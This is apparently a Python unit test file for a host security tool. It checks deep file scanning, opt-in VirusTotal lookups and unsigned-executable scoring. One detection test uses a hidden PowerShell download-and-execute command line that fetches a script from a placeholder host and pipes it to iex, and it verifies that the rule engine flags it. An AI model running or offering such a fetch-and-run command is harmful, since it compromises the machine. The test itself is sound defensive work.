from pathlib import Path
from dataclasses import replace
from tempfile import TemporaryDirectory
from unittest.mock import patch
import struct
import unittest

from monarch_security.analysis import RuleEngine
from monarch_security.config import load_config
from monarch_security.deep_scan import deep_scan_file
from monarch_security.events import SecurityEvent
from monarch_security.llm import LLMRouter
from monarch_security.policy import PolicyEngine
from monarch_security.resources import ResourceGuard


class DeepScanHardeningTests(unittest.TestCase):
    def test_virustotal_lookup_is_not_used_without_explicit_opt_in(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "sample.txt"
            path.write_text("benign sample", encoding="utf-8")
            config = _config_with_virustotal_key()
            rules = RuleEngine(config.router)
            policy = PolicyEngine(config.policy)
            router = LLMRouter(config, ResourceGuard(config.resources), policy)

            with patch("monarch_security.deep_scan.virustotal_scan") as virustotal_scan:
                payload = deep_scan_file(
                    path,
                    config,
                    rules,
                    router,
                    policy,
                    no_llm=True,
                    defender=False,
                )

            virustotal_scan.assert_not_called()
            self.assertFalse(payload["deep_scan"]["virustotal_checked"])
            self.assertFalse(payload["deep_scan"]["virustotal_requested"])
            self.assertNotIn("virustotal", payload["assessment"]["event"]["facts"])

    def test_virustotal_opt_in_escalates_malicious_hash(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "sample.txt"
            path.write_text("benign sample", encoding="utf-8")
            config = _config_with_virustotal_key()
            rules = RuleEngine(config.router)
            policy = PolicyEngine(config.policy)
            router = LLMRouter(config, ResourceGuard(config.resources), policy)

            with patch(
                "monarch_security.deep_scan.virustotal_scan",
                return_value={
                    "available": True,
                    "malicious": 2,
                    "suspicious": 0,
                    "undetected": 0,
                    "harmless": 0,
                },
            ) as virustotal_scan:
                payload = deep_scan_file(
                    path,
                    config,
                    rules,
                    router,
                    policy,
                    no_llm=True,
                    defender=False,
                    virustotal=True,
                )

            virustotal_scan.assert_called_once_with(
                payload["assessment"]["event"]["facts"]["sha256"],
                "unit-test-key",
            )
            self.assertTrue(payload["deep_scan"]["virustotal_checked"])
            self.assertTrue(payload["deep_scan"]["virustotal_requested"])
            self.assertEqual(payload["assessment"]["severity"], "critical")
            self.assertEqual(payload["assessment"]["route"], "llm")
            self.assertEqual(payload["decision"]["action"], "ask_user")
            self.assertTrue(
                any(
                    "VirusTotal reports file as malicious" in reason
                    for reason in payload["assessment"]["reasons"]
                )
            )

    def test_unsigned_executable_deep_scan_reaches_review_threshold(self):
        with TemporaryDirectory() as directory:
            path = Path(directory) / "payload.exe"
            path.write_bytes(_minimal_pe())
            config = load_config()
            rules = RuleEngine(config.router)
            policy = PolicyEngine(config.policy)
            router = LLMRouter(config, ResourceGuard(config.resources), policy)

            with patch(
                "monarch_security.deep_scan.authenticode_facts",
                return_value={
                    "authenticode_status": "NotSigned",
                    "authenticode_signed": False,
                },
            ):
                payload = deep_scan_file(
                    path,
                    config,
                    rules,
                    router,
                    policy,
                    no_llm=True,
                    defender=False,
                )

            assessment = payload["assessment"]
            decision = payload["decision"]
            self.assertTrue(payload["deep_scan"]["authenticode_checked"])
            self.assertGreaterEqual(assessment["score"], 35)
            self.assertEqual(assessment["route"], "deep_scan")
            self.assertTrue(
                any("not Authenticode signed" in reason for reason in assessment["reasons"])
            )
            self.assertTrue(
                any("unsigned" in control.lower() for control in decision["controls"])
            )

    def test_network_process_command_line_strengthens_public_connection(self):
        rules = RuleEngine(load_config().router)
        event = SecurityEvent(
            kind="network.connection_seen",
            source="test",
            subject="203.0.113.10:443",
            facts={
                "remote_address": "203.0.113.10",
                "remote_port": 443,
                "remote_scope": "public",
                "remote_is_public": True,
                "process_name": "powershell.exe",
                "process_cmdline": [
                    "powershell.exe",
                    "-NoP",
                    "-WindowStyle",
                    "Hidden",
                    "iwr",
                    "https://example.invalid/a.ps1",
                    "|",
                    "iex",
                ],
            },
        )

        assessment = rules.assess(event)

        self.assertGreaterEqual(assessment.score, 65)
        self.assertEqual(assessment.route, "llm")
        self.assertTrue(
            any("Network-owning process command line" in reason for reason in assessment.reasons)
        )


def _minimal_pe() -> bytes:
    data = bytearray(1024)
    data[:2] = b"MZ"
    pe_offset = 0x80
    struct.pack_into("<I", data, 0x3C, pe_offset)
    data[pe_offset : pe_offset + 4] = b"PE\x00\x00"
    struct.pack_into(
        "<HHIIIHH",
        data,
        pe_offset + 4,
        0x8664,
        1,
        0,
        0,
        0,
        0xF0,
        0,
    )
    optional_offset = pe_offset + 24
    struct.pack_into("<H", data, optional_offset, 0x20B)
    struct.pack_into("<H", data, optional_offset + 68, 3)
    section_offset = optional_offset + 0xF0
    data[section_offset : section_offset + 8] = b".text\x00\x00\x00"
    struct.pack_into("<I", data, section_offset + 16, 64)
    struct.pack_into("<I", data, section_offset + 20, 0x300)
    data[0x300 : 0x340] = b"\x90" * 64
    return bytes(data)


def _config_with_virustotal_key():
    config = load_config()
    return replace(
        config,
        policy=replace(config.policy, virustotal_api_key="unit-test-key"),
    )
